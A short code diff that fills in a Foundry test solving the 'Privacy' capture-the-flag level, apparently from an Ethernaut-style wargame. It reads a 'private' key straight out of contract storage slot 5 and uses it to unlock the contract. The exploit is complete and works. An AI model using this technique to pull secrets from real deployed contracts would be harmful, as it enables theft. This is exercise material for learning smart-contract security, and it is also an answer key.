@@ -37,7 +37,8 @@ contract TestPrivacy is BaseTest {
         /** CODE YOUR EXPLOIT HERE */
 
         vm.startPrank(player, player);
-
+        bytes16 _key = bytes16(vm.load(address(level), bytes32(uint256(5))));
+        level.unlock(_key);
         vm.stopPrank();
     }
 }
